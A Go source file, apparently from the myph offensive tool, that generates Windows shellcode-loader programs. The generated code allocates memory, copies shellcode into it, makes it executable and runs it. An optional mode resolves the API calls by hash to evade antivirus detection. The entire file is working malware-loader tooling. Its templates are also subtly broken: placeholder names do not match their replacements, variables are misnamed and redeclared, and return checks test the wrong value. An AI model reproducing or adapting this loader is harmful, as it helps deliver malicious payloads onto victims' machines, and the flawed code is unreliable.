package loaders

import (
	"fmt"
	"github.com/cmepw/myph/v2/cli"
	"strings"
)

type SyscallTemplate struct {
	UseApiHashing bool
	HashMethod    cli.ApiHashTechnique
}

func (t SyscallTemplate) Import() string {
	if t.UseApiHashing {
		return fmt.Sprintf(`
import (
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	loader "github.com/cmepw/myph/internals"
)
        `)

	}

	return fmt.Sprintf(`
import (
	"syscall"
	"unsafe"
)
`)
}

func (t SyscallTemplate) Const() string {

	if t.UseApiHashing {
		return fmt.Sprintf(`
const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)
`)

	}

	return fmt.Sprintf(`
const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

var (
    kernel32 = syscall.MustLoadDLL("kernel32.dll")
	ntdll = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
	VirtualProtect = kernel32.MustFindProc("VirtualProtect")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

`)
}

func (t SyscallTemplate) Init() string {
	return fmt.Sprintf("\n")
}

func (t SyscallTemplate) Process() string {
	if t.UseApiHashing {

		/*
			FIXME(djnn): reading ntdll or kernel32 from disk sucks, we should recover it from PEB instead
			but i will address this later

			also, we should probably only read from ntdll
		*/

		hashedVirtualAlloc := t.HashMethod.HashItem("VirtualAlloc")
		hashedVirtualProtect := t.HashMethod.HashItem("VirtualProtect")
		hashedRtlCopyMemory := t.HashMethod.HashItem("RtlCopyMemory")

		hashedMethod := t.HashMethod.String()

		template := fmt.Sprintf(`

    ntdll, err := pe.Open("C:\\Windows\\System32\\ntdll.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer ntdll.Close()


    kernel32, err := pe.Open("C:\\Windows\\System32\\kernel32.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer kernel32.Close()


    var addr uintptr
	regionsize := uintptr(len(shellcode))
    VirtualAlloc, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALALLOC__", kernel32)
	if err != nil {
		log.Fatal(err)
	}

    addr = loader.HashedCall(
        VirtualAlloc,
        0,
        regionSize,
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE,
    )

    if addr == 0 {
        log.Fatal("Error: null return value")
    }

    RtlCopyMemory, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "_HASHED_RTLCOPYMEMORY__", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedCall(
        RtlCopyMemory,
        addr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        regionsize,
    ); if addr != 0 {
        log.Fatal("Error: invalid return value")
    }

    oldProtect := PAGE_READWRITE
    VirtualProtect, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALPROTECT__", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedCall(
        VirtualProtect,
        addr,
        regionsize,
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    ); if addr != 0 {
        log.Fatal("Error: invalid return value")
    }

    _, _, _ = syscall.SyscallN(addr)

        `)

		template = strings.ReplaceAll(template, "__HASH__METHOD__", hashedMethod)
		template = strings.ReplaceAll(template, "__HASHED__VIRTUALPROTECT__", hashedVirtualProtect)
		template = strings.ReplaceAll(template, "__HASHED__VIRTUALALLOC__", hashedVirtualAlloc)
		template = strings.ReplaceAll(template, "__HASHED__RTLCOPYMEMORY__", hashedRtlCopyMemory)
		return template
	}

	return fmt.Sprintf(`
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	oldProtect := PAGE_READWRITE
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = syscall.SyscallN(addr)
`)
}

func (t SyscallTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__INIT__

__IMPORT__PROCESS__

}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return template
}
